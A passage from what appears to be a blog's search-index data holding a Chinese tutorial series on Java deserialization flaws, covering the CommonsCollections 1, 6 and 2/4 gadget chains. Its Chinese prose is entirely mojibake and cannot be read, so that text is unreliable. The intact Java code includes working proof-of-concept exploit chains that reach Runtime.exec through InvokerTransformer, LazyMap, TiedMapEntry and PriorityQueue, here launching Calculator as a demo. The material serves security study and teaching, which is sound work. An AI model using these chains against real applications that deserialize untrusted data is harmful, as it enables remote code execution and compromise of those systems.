å±æ€§ã€‚é€šè¿‡è°ƒç”¨è¯¥ç±»çš„ decorate æ–¹æ³•ï¼Œå¯ä»¥æ„é€ ä¸€ä¸ª TransformedMap å¯¹è±¡ã€‚ æ¥ä¸‹æ¥å»å¯»æ‰¾è°ƒç”¨äº† checkSetValue çš„ sourceï¼š åœ¨ MapEntry ä¸­ï¼Œå­˜åœ¨ setValue æ–¹æ³•ã€‚å› æ­¤ï¼Œè¯¥é“¾çš„å‰åŠæ®µ POC å¦‚ä¸‹ï¼š æ¥ä¸‹æ¥å°±æ˜¯å»å¯»æ‰¾ååºåˆ—åŒ–çš„å…¥å£ï¼Œåœ¨ AnnotationInvocationHandler ç±»ä¸­ï¼Œé‡å†™äº† readObject æ–¹æ³•ï¼Œåœ¨è¯¥æ–¹æ³•ä¸­ï¼Œå¯¹ MapEntry è°ƒç”¨äº† setValue æ–¹æ³•ã€‚ è¯¥ç±»éå…¬æœ‰ï¼Œå› æ­¤ï¼Œéœ€è¦é€šè¿‡åå°„æ¥æ„é€ å…¶å¯¹è±¡ï¼š Class annotationClass = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = annotationClass.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object obj = constructor.newInstance(Override.class, outerMap); å¯¹ obj å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–ï¼Œæ„æˆæ•´æ¡é“¾çš„åˆ©ç”¨æ€è·¯ã€‚æ•´ä¸ªè¿‡ç¨‹æ¶‰åŠåˆ°å¦‚ä¸‹å‡ ä¸ªæ¥å£å’Œç±»çš„å…·ä½“ä½œç”¨åŠä¸€äº›ç»†èŠ‚å¦‚ä¸‹ã€‚ 2.3.2 TransformedMap TransformedMap ç”¨äºå¯¹ Java æ ‡å‡†æ•°æ®ç»“æ„ Map åšä¸€ä¸ªä¿®é¥°ï¼Œè¢«ä¿®é¥°è¿‡çš„ Map åœ¨æ·»åŠ æ–°çš„å…ƒç´ æ—¶ï¼Œå°†å¯ä»¥æ‰§è¡Œè‡ªå®šä¹‰çš„å›è°ƒå‡½æ•°ã€‚å¦‚ä¸‹ï¼Œå¯¹ innerMap è¿›è¡Œä¿®é¥°ï¼Œä¼ å‡ºçš„ outerMap å³æ˜¯ä¿®é¥°åçš„ Map: MapouterMap = TransformedMap.decorate(innerMap, keyTransformer, valueTransformer); å…¶ä¸­ï¼ŒkeyTransformer æ˜¯å¤„ç†æ–°å…ƒç´ çš„ Key çš„å›è°ƒï¼ŒvalueTransformer æ˜¯å¤„ç†æ–°å…ƒç´ çš„ value çš„å›è°ƒã€‚ æˆ‘ä»¬è¿™é‡Œæ‰€è¯´çš„ã€Œå›è°ƒã€ï¼Œå¹¶ä¸æ˜¯ä¼ ç»Ÿæ„ä¹‰ä¸Šçš„ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œè€Œæ˜¯ä¸€ä¸ªå®ç°äº† Transformer æ¥å£çš„ç±»ã€‚ 2.3.3 Transformer Transformer æ˜¯ä¸€ä¸ªæ¥å£ï¼Œå®ƒåªæœ‰ä¸€ä¸ªå¾…å®ç°çš„æ–¹æ³•: TransformedMap åœ¨è½¬æ¢ Map çš„æ–°å…ƒç´ æ—¶ï¼Œå°±ä¼šè°ƒç”¨ transform æ–¹æ³•ï¼Œè¿™ä¸ªè¿‡ç¨‹å°±ç±»ä¼¼åœ¨è°ƒç”¨ä¸€ä¸ªã€Œå›è°ƒå‡½æ•°ã€ï¼Œè¿™ä¸ªå›è°ƒçš„å‚æ•°æ˜¯åŸå§‹å¯¹è±¡ã€‚ 2.3.4 ConstantTransformer ConstantTransformer æ˜¯å®ç°äº† Transformer æ¥å£çš„ä¸€ä¸ªç±»ï¼Œå®ƒçš„è¿‡ç¨‹å°±æ˜¯åœ¨æ„é€ å‡½æ•°çš„æ—¶å€™ä¼ å…¥ä¸€ä¸ªå¯¹è±¡: å¹¶åœ¨ transform æ–¹æ³•å°†è¿™ä¸ªå¯¹è±¡å†è¿”å›ï¼š 2.3.5 InvokerTransformer InvokerTransformer æ˜¯å®ç°äº† Transformer æ¥å£çš„ä¸€ä¸ªç±»ï¼Œè¿™ä¸ªç±»å¯ä»¥ç”¨æ¥æ‰§è¡Œä»»æ„æ–¹æ³•ï¼Œè¿™ä¹Ÿæ˜¯ååºåˆ—åŒ–èƒ½æ‰§è¡Œä»»æ„ä»£ç çš„å…³é”®ã€‚ åœ¨å®ä¾‹åŒ–è¿™ä¸ª InvokerTransformer æ—¶ï¼Œéœ€è¦ä¼ å…¥ä¸‰ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¾…æ‰§è¡Œçš„æ–¹æ³•åï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯è¿™ä¸ªå‡½æ•°çš„å‚æ•°åˆ—è¡¨çš„å‚æ•°ç±»å‹ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ä¼ ç»™è¿™ä¸ªå‡½æ•°çš„å‚æ•°åˆ—è¡¨ã€‚ åé¢çš„å›è°ƒ transform æ–¹æ³•ï¼Œå°±æ˜¯æ‰§è¡Œäº† input å¯¹è±¡çš„ iMethodName æ–¹æ³•: ä»¥æ‰§è¡Œ calc ä¸ºä¾‹ï¼š 2.3.6 ChainedTransformer ChainedTransformer ä¹Ÿæ˜¯å®ç°äº† Transformer æ¥å£çš„ä¸€ä¸ªç±»ï¼Œå®ƒçš„ä½œç”¨æ˜¯å°†å†…éƒ¨çš„å¤šä¸ª Transformer ä¸²åœ¨ä¸€èµ·ã€‚é€šä¿—æ¥è¯´å°±æ˜¯ï¼Œå‰ä¸€ä¸ªå›è°ƒè¿”å›çš„ç»“æœï¼Œä½œä¸ºåä¸€ä¸ªå›è°ƒçš„å‚æ•°ä¼ å…¥ã€‚ å¼•ç”¨ phith0n çš„ä¸€å¼ å›¾ï¼š 2.3.7 AnnotationInvocationHandler è§¦å‘è¿™ä¸ªæ¼æ´çš„æ ¸å¿ƒï¼Œåœ¨äºå‘ Map ä¸­åŠ å…¥ä¸€ä¸ªæ–°çš„å…ƒç´ ã€‚åœ¨ä¸Šé¢çš„ demo ä¸­ï¼Œé€šè¿‡æ‰‹åŠ¨æ‰§è¡Œ outerMap.put(\"test\", \"xxxx\"); æ¥è§¦å‘æ¼æ´ï¼Œä½†åœ¨å®é™…ååºåˆ—åŒ–æ—¶ï¼Œéœ€è¦æ‰¾åˆ°ä¸€ä¸ªç±»ï¼Œå®ƒåœ¨ååºåˆ—åŒ–çš„ readObject é€»è¾‘é‡Œæœ‰ç±»ä¼¼çš„å†™å…¥æ“ä½œã€‚ åœ¨ AnnotationInvocationHandler ç±»ä¸­çš„ readObjectï¼š æ ¸å¿ƒé€»è¾‘å°±æ˜¯ Map.Entry\u003cString, Object\u003e memberValue : memberValues.entrySet() å’Œ memberValue.setValue(...) ã€‚åœ¨è°ƒç”¨ setValue è®¾ç½®å€¼çš„æ—¶å€™å°±ä¼šè§¦å‘ TransformedMap é‡Œæ³¨å†Œçš„ Transformï¼Œè¿›è€Œæ‰§è¡Œ payloadã€‚ æ¥ä¸‹æ¥æ„é€  POC æ—¶ï¼Œé¦–å…ˆåˆ›å»ºä¸€ä¸ª AnnotationInvocationHandlerï¼š Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); Object obj = construct.newInstance(Retention.class, outerMap); ç”±äº sun.reflect.annotation.AnnotationInvocationHandler æ˜¯ JDK çš„å†…éƒ¨ç±»ï¼Œå…¶æ„é€ å‡½æ•°æ˜¯ç§æœ‰çš„ï¼Œå› æ­¤é€šè¿‡åå°„æ¥åˆ›å»ºå¯¹è±¡ã€‚ 2.3.8 è¿›ä¸€æ­¥å®Œå–„ é€šè¿‡æ„é€  AnnotationInvocationHandler ç±»ï¼Œæ¥åˆ›å»ºååºåˆ—åŒ–åˆ©ç”¨é“¾çš„èµ·ç‚¹ï¼Œç”¨å¦‚ä¸‹ä»£ç å°†å¯¹è±¡åºåˆ—åŒ–ï¼š ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(obj); oos.close(); ä½†æ˜¯ï¼Œåœ¨ç»è¿‡åºåˆ—åŒ–æ—¶ï¼ŒæŠ›å‡ºå¼‚å¸¸ï¼š åœ¨æœ¬ç³»åˆ—çš„ç¬¬ä¸€éƒ¨åˆ†æè¿°è¿‡ï¼Œjava.lang.Runtime è¿™ä¸ªç±»æ²¡æœ‰å®ç° Serializable æ¥å£ï¼Œæ— æ³•åºåˆ—åŒ–ã€‚å› æ­¤ï¼Œéœ€è¦é€šè¿‡åå°„æ¥è·å–å½“å‰ä¸Šä¸‹æ–‡ä¸­çš„ java.lang.Runtime å¯¹è±¡ã€‚ Method m = Runtime.class.getMethod(\"getRuntime\"); Runtime r = (Runtime) m.invoke(null); r.exec(\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"); è½¬æ¢æˆ Transformer çš„å†™æ³•ï¼š Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}), }; ä½†æ˜¯ï¼Œæ‰§è¡Œè¿‡åï¼Œå‘ç°ä»ç„¶æ²¡æœ‰å¼¹å‡ºè®¡ç®—å™¨ã€‚ åŠ¨æ€è°ƒè¯•å‘ç°ä¸ AnnotationInvocationHandler ç±»çš„é€»è¾‘æœ‰å…³ï¼Œåœ¨ AnnotationInvocationHandler:readObject çš„é€»è¾‘ä¸­ï¼Œæœ‰ä¸€ä¸ª if è¯­å¥å¯¹ var7 è¿›è¡Œåˆ¤æ–­ï¼Œåªæœ‰åœ¨å…¶ä¸æ˜¯ null çš„æ—¶å€™æ‰ä¼šè¿›å…¥é‡Œé¢æ‰§è¡Œ setValueï¼Œå¦åˆ™ä¸ä¼šè¿›å…¥ä¹Ÿå°±ä¸ä¼šè§¦å‘æ¼æ´ã€‚ é‚£ä¹ˆå¦‚ä½•è®©è¿™ä¸ª var7 ä¸ä¸º null å‘¢ï¼Ÿéœ€è¦å¦‚ä¸‹ä¸¤ä¸ªæ¡ä»¶: sun.reflect.annotation.AnnotationInvocationHandler æ„é€ å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å¿…é¡»æ˜¯ Annotation çš„å­ç±»ï¼Œä¸”å…¶ä¸­å¿…é¡»å«æœ‰è‡³å°‘ä¸€ä¸ªæ–¹æ³•ï¼Œå‡è®¾æ–¹æ³•åæ˜¯","date":"2021-08-26","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/:2:3","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-2","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/"},{"categories":["ä»£ç å®¡è®¡"],"content":"3 CommonsCollections 6 Gadget åˆ†æ ","date":"2021-08-26","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/:3:0","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-2","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/"},{"categories":["ä»£ç å®¡è®¡"],"content":"3.1 è°ƒç”¨é“¾ java.io.ObjectInputStream.readObject() java.util.HashSet.readObject() java.util.HashMap.put() java.util.HashMap.hash() org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() org.apache.commons.collections.map.LazyMap.get() org.apache.commons.collections.functors.ChainedTransformer.transform() org.apache.commons.collections.functors.InvokerTransformer.transform() java.lang.reflect.Method.invoke() java.lang.Runtime.exec() ","date":"2021-08-26","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/:3:1","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-2","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/"},{"categories":["ä»£ç å®¡è®¡"],"content":"3.2 POC public class Main { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] {\"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }), new InvokerTransformer(\"exec\",new Class[] { String.class }, new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, new ConstantTransformer(1)); TiedMapEntry te = new TiedMapEntry(lazyMap, \"poc\"); HashSet ht = new HashSet(); ht.add(te); innerMap.remove(\"poc\"); Class c = LazyMap.class; Field f = c.getDeclaredField(\"factory\"); f.setAccessible(true); f.set(lazyMap, transformerChain); // åºåˆ—åŒ– ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(ht); oos.close(); // ååºåˆ—åŒ– ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); ois.readObject(); } } ","date":"2021-08-26","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/:3:2","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-2","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/"},{"categories":["ä»£ç å®¡è®¡"],"content":"3.3 åˆ†æ CommonsCollections 6 çš„ sink é“¾ä½¿ç”¨çš„ä¾æ—§æ˜¯ InvokerTransformer åå°„æ¥å£ï¼Œåˆ©ç”¨ ChainedTransformer ä¸²è”ä¸‰æ¬¡ InvokerTransformer åå°„å’Œ ConstantTransformer æ¥å£ï¼Œè·å– Runtime ç±»ã€‚ åœ¨ CommonsCollections 1 ä¸­ï¼Œé€šè¿‡äº¤å‰å¼•ç”¨æœç´¢åˆ°å¦å¤–ä¸€ä¸ªç±» LazyMap ä¸­çš„ get æ–¹æ³•è°ƒç”¨äº† transform æ–¹æ³•ã€‚ é€šè¿‡è°ƒç”¨ LazyMap.decorate æ–¹æ³•ï¼Œå°†æ¶æ„çš„ ChainedTransformer èµ‹å€¼ç»™ LazyMap#factoryï¼Œå½“è°ƒç”¨ LazyMap#get(Object key) æ–¹æ³•ï¼Œåˆ™ä¼šè§¦å‘æ¶æ„ä»£ç çš„æ‰§è¡Œã€‚ï¼ˆä¸ CommonsCollections 1ã€CommonsCollections 5 çš„ sink ç‚¹ç›¸åŒï¼‰ public static void main(String[] args) { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] {\"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }), new InvokerTransformer(\"exec\",new Class[] { String.class }, new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); outerMap.get(\"poc\"); } CommonsCollections 6 gadget ä½œè€…æ‰¾åˆ°äº† TiedMapEntry ç±»ï¼Œå…¶ä¸­åœ¨ TiedMapEntry#getValue() æ–¹æ³•ä¸­è°ƒç”¨äº† this.map.get(this.key) æ–¹æ³•ã€‚ public Object getValue() { return this.map.get(this.key); } è°ƒç”¨ TiedMapEntry(Map map, Object key) æ„é€ æ–¹æ³•ï¼Œå¯ä»¥ä¸º TiedMapEntry#map èµ‹å€¼ åœ¨ TiedMapEntry ä¸­çš„ equals(Object obj)ã€hashCode()ã€toString() æ–¹æ³•ä¸­éƒ½è°ƒç”¨äº† TiedMapEntry#getValue() æ–¹æ³•ã€‚è¿™é‡Œä½œè€…é€‰æ‹©è°ƒç”¨ TiedMapEntry#hashCode() æ–¹æ³•ã€‚ æ¥ä¸‹æ¥çš„æ€è·¯å°±å’Œ DNSURL é“¾ç±»ä¼¼ï¼Œé€šè¿‡ HashMap å…¥å£è¿›è¡Œååºåˆ—åŒ–ã€‚ TiedMapEntry te = new TiedMapEntry(lazyMap, \"Geekby\"); te.hashCode(); ä½†æ˜¯ï¼Œåœ¨æ„é€  HashMap æ—¶ï¼Œè°ƒç”¨ put æ–¹æ³•ï¼Œæ‰§è¡Œ hashcode æ–¹æ³•ï¼Œä¼šç›´æ¥æ‰§è¡Œåç»­çš„å‘½ä»¤æ‰§è¡Œæ“ä½œï¼Œæƒ…å†µå’Œ DNSURL é“¾ç›¸ä¼¼ï¼Œå› æ­¤ï¼Œéœ€è¦é€šè¿‡åå°„æ¥è¿›è¡Œä¸€äº›è®¾ç½®ã€‚ Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, new ConstantTransformer(1)); TiedMapEntry te = new TiedMapEntry(lazyMap, \"Geekby\"); HashMap\u003cObject, Object\u003e ht = new HashMap\u003c\u003e(); ht.put(te, null); // ht put åï¼Œè°ƒç”¨ TiedMapEntry#hashCode ä¸­ getValue() // è°ƒç”¨ lazyMap#get æ–¹æ³• // åˆ¤æ–­ innerMap ä¸­æ˜¯å¦å«æœ‰ \"Geekby\" è¿™ä¸ª key // æ²¡æœ‰ï¼Œè¿›å…¥ if é€»è¾‘ï¼Œè°ƒç”¨ transformï¼Œå‘ innerMap ä¸­æ·»åŠ å¯¹åº”çš„ Key:Value // ç„¶åå†åˆ é™¤è¿™ä¸ªé”®å€¼å¯¹ï¼Œä¾¿äºåç»­ååºåˆ—åŒ–å†æ¬¡è¿›å…¥ if é€»è¾‘ã€‚ innerMap.remove(\"Geekby\"); // æ­¤å¤–å°† LazyMap#factory å±æ€§è¿˜åŸä¸º transformerChain ï¼ˆé˜²æ­¢æ„é€ æ—¶å°±æ‰§è¡Œï¼‰ Class c = LazyMap.class; Field factoryField = c.getDeclaredField(\"factory\"); factoryField.setAccessible(true); factoryField.set(lazyMap, transformerChain); ","date":"2021-08-26","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/:3:3","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-2","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/"},{"categories":["ä»£ç å®¡è®¡"],"content":"4 CommonsCollections 2\u0026\u00264 Gadget åˆ†æ åœ¨ 2015 å¹´åº• commons-collections ååºåˆ—åŒ–åˆ©ç”¨é“¾è¢«æå‡ºæ—¶ï¼ŒApache Commons Collections æœ‰ä»¥ä¸‹ä¸¤ä¸ªåˆ†æ”¯ç‰ˆæœ¬ï¼š commons-collections:commons-collections org.apache.commons:commons-collections4 å¯â»…ï¼ŒgroupId å’Œ artifactId éƒ½å˜äº†ã€‚å‰è€…æ˜¯ Commons Collections è€çš„ç‰ˆæœ¬åŒ…ï¼Œå½“æ—¶ç‰ˆæœ¬å·æ˜¯3.2.1ï¼Œåè€…æ˜¯å®˜æ–¹åœ¨ 2013 å¹´æ¨å‡ºçš„ 4 ç‰ˆæœ¬ï¼Œå½“æ—¶ç‰ˆæœ¬å·æ˜¯ 4.0ã€‚ å®˜æ–¹è®¤ä¸ºæ—§çš„ commons-collections æœ‰ä¸€äº›æ¶æ„å’Œ API è®¾è®¡ä¸Šçš„é—®é¢˜ï¼Œä½†ä¿®å¤è¿™äº›é—®é¢˜ï¼Œä¼šäº§ç”Ÿå¤§é‡ä¸èƒ½å‘å‰å…¼å®¹çš„æ”¹åŠ¨ã€‚æ‰€ä»¥ï¼Œcommons-collections4 ä¸å†è®¤ä¸ºæ˜¯ä¸€ä¸ªç”¨æ¥æ›¿æ¢ commons-collections çš„æ–°ç‰ˆæœ¬ï¼Œè€Œæ˜¯ä¸€ä¸ªæ–°çš„åŒ…ï¼Œä¸¤è€…çš„å‘½åç©ºé—´ä¸å†²çªï¼Œå› æ­¤å¯ä»¥å…±å­˜åœ¨åŒä¸€ä¸ªé¡¹ç›®ä¸­ã€‚ é‚£ä¹ˆï¼Œæ—¢ç„¶ 3.2.1 ä¸­å­˜åœ¨ååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Œé‚£ä¹ˆ 4.0 ç‰ˆæœ¬æ˜¯å¦å­˜åœ¨å‘¢? ","date":"2021-08-26","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/:4:0","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-2","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/"},{"categories":["ä»£ç å®¡è®¡"],"content":"4.1 CommonsCollections4 åŒ…çš„æ”¹åŠ¨ ç”±äºä¸¤ä¸ªç‰ˆæœ¬çš„åº“å¯ä»¥å…±å­˜ï¼Œå› æ­¤æŠŠä¸¤ä¸ªåŒ…æ”¾åˆ°åŒä¸€ä¸ªé¡¹ç›®ä¸­çš„ pom.xml è¿›è¡Œæ¯”è¾ƒï¼š \u003cdependencies\u003e \u003cdependency\u003e \u003cgroupId\u003ecommons-collections\u003c/groupId\u003e \u003cartifactId\u003ecommons-collections\u003c/artifactId\u003e \u003cversion\u003e3.2.1\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.commons\u003c/groupId\u003e \u003cartifactId\u003ecommons-collections4\u003c/artifactId\u003e \u003cversion\u003e4.0\u003c/version\u003e \u003c/dependency\u003e \u003c/dependencies\u003e ç”¨ä¹‹å‰çš„ CommonsCollections6 åˆ©ç”¨é“¾åšä¸ªä¾‹å­ï¼Œç„¶åå°†æ‰€æœ‰ import org.apache.commons.collections.* æ”¹æˆ import org.apache.commons.collections4.* ã€‚ ç›´æ¥è¿è¡Œï¼Œå‘ç° LazyMap.decorate è¿™ä¸ªæ–¹æ³•æ²¡æœ‰äº†ï¼š åœ¨ 3 ä¸­çš„å®šä¹‰ï¼š public static Map decorate(Map map, Transformer factory) { return new LazyMap(map, factory); } è€Œåœ¨ 6 ä¸­çš„å®šä¹‰ï¼š public static \u003cK, V\u003e LazyMap\u003cK, V\u003e lazyMap(final Map\u003cK, V\u003e map, final Factory\u003c ? extends V\u003e factory) { return new LazyMap\u003cK,V\u003e(map, factory); } è¿™ä¸ªæ–¹æ³•ä¸è¿‡å°±æ˜¯ LazyMap æ„é€ å‡½æ•°çš„ä¸€ä¸ªåŒ…è£…ï¼Œè€Œåœ¨ 4 ä¸­å…¶å®åªæ˜¯æ”¹äº†ä¸ªåå­—å« lazyMapã€‚ æ‰€ä»¥ï¼Œå°† Gadget ä¸­å‡ºé”™çš„ä»£ç æ¢ä¸€ä¸‹åå­—ï¼š MapouterMap = LazyMap.lazyMap(innerMap, transformerChain); è¿è¡Œï¼š åŒç†ï¼Œä¹‹å‰çš„ CC1 Gadgetã€CC6 Gadgetï¼Œéƒ½å¯ä»¥åœ¨ CommonsCollections4 ä¸­æ­£å¸¸ä½¿ç”¨ã€‚ ","date":"2021-08-26","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/:4:1","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-2","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/"},{"categories":["ä»£ç å®¡è®¡"],"content":"4.2 PriorityQueue åˆ©ç”¨é“¾ ysoserial è¿˜ä¸º commons-collections4 å‡†å¤‡äº†ä¸¤æ¡æ–°çš„åˆ©ç”¨é“¾ï¼Œé‚£å°±æ˜¯ CommonsCollections2 å’Œ CommonsCollections4ã€‚ commons-collections è¿™ä¸ªåŒ…ä¹‹æ‰€æœ‰èƒ½æ”’å‡ºé‚£ä¹ˆå¤šåˆ©ç”¨é“¾æ¥ï¼Œé™¤äº†å› ä¸ºå…¶ä½¿ç”¨é‡å¤§ï¼ŒæŠ€æœ¯ä¸Šçš„åŸå› æ˜¯å…¶ä¸­åŒ…å«äº†ä¸€äº›å¯ä»¥æ‰§è¡Œä»»æ„æ–¹æ³•çš„ Transformerã€‚æ‰€ä»¥ï¼Œåœ¨ commons-collections ä¸­æ‰¾ Gadget çš„è¿‡ç¨‹ï¼Œå®é™…ä¸Šå¯ä»¥ç®€åŒ–ä¸ºï¼Œæ‰¾ä¸€æ¡ä» Serializable#readObject() æ–¹æ³•åˆ° Transformer#transform() æ–¹æ³•çš„è°ƒç”¨é“¾ã€‚ 4.2.1 CommonsCollections2 Gadget 4.2.1.1 è°ƒç”¨é“¾ ObjectInputStream.readObject() PriorityQueue.readObject() ... TransformingComparator.compare() InvokerTransformer.transform() Method.invoke() Runtime.exec() 4.2.1.2 åˆ†æ åœ¨ CC2 ä¸­ï¼Œç”¨åˆ°çš„ä¸¤ä¸ªå…³é”®ç±»æ˜¯ï¼š java.util.PriorityQueue org.apache.commons.collections4.comparators.TransformingComparator é¦–å…ˆï¼Œjava.util.PriorityQueue ç±»æ‹¥æœ‰è‡ªå·±çš„ readObject()ï¼š org.apache.commons.collections4.comparators.TransformingComparator ä¸­æœ‰è°ƒç”¨ transform() æ–¹æ³•çš„å‡½æ•°ï¼š æ‰€ä»¥ï¼ŒCommonsCollections2 å®é™…å°±æ˜¯ä¸€æ¡ä» PriorityQueue åˆ° TransformingComparator çš„åˆ©ç”¨é“¾ã€‚ æ¥ä¸‹æ¥çœ‹ä¸‹è¿™ä¸ª Gadget çš„ä¸²è”æ–¹å¼ï¼š PriorityQueue#readObject() ä¸­è°ƒç”¨äº† heapify() æ–¹æ³•ï¼Œ heapify() ä¸­è°ƒç”¨äº† siftDown() ï¼Œ siftDown() ä¸­è°ƒç”¨ siftDownUsingComparator() ï¼Œ siftDownUsingComparator() ä¸­è°ƒç”¨çš„ comparator.compare() ï¼Œäºæ˜¯å°±è¿æ¥åˆ°ä¸Šé¢çš„ TransformingComparator äº†ï¼š æ€»ç»“èµ·æ¥å°±æ˜¯ï¼š java.util.PriorityQueue æ˜¯ä¸€ä¸ªä¼˜å…ˆé˜Ÿåˆ—(Queue)ï¼ŒåŸºäºäºŒå‰å †å®ç°ï¼Œé˜Ÿåˆ—ä¸­æ¯ä¸€ä¸ªå…ƒç´ æœ‰è‡ªå·±çš„ä¼˜å…ˆçº§ï¼ŒèŠ‚ç‚¹ä¹‹é—´æŒ‰ç…§ä¼˜å…ˆçº§å¤§å°æ’åºæˆä¸€æ£µæ ‘ã€‚ ååºåˆ—åŒ–æ—¶è°ƒç”¨ heapify() æ–¹æ³•ï¼Œæ˜¯ä¸ºäº†ååºåˆ—åŒ–åï¼Œéœ€è¦æ¢å¤è¿™ä¸ªç»“æ„çš„é¡ºåºã€‚ æ’åºæ˜¯é å°†å¤§çš„å…ƒç´ ä¸‹ç§»å®ç°çš„ã€‚siftDown() æ˜¯å°†èŠ‚ç‚¹ä¸‹ç§»çš„å‡½æ•°ï¼Œ è€Œ comparator.compare() ç”¨æ¥æ¯”è¾ƒä¸¤ä¸ªå…ƒç´ å¤§å°ã€‚ TransformingComparator å®ç°äº† java.util.Comparator æ¥å£ï¼Œè¿™ä¸ªæ¥å£ç”¨äºå®šä¹‰ä¸¤ä¸ªå¯¹è±¡å¦‚ä½•è¿›è¡Œæ¯”è¾ƒã€‚ siftDownUsingComparator() ä¸­å°±ä½¿ç”¨è¿™ä¸ªæ¥å£çš„ compare() æ–¹æ³•æ¯”è¾ƒæ ‘çš„èŠ‚ç‚¹ã€‚ POC å¦‚ä¸‹ï¼š package CC4Test; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.Comparator; import java.util.PriorityQueue; public class CC4Test { public static void main(String[] args) throws Exception { Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] { String.class, Class[].class }, new Object[] {\"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] {null, new Object[0] }), new 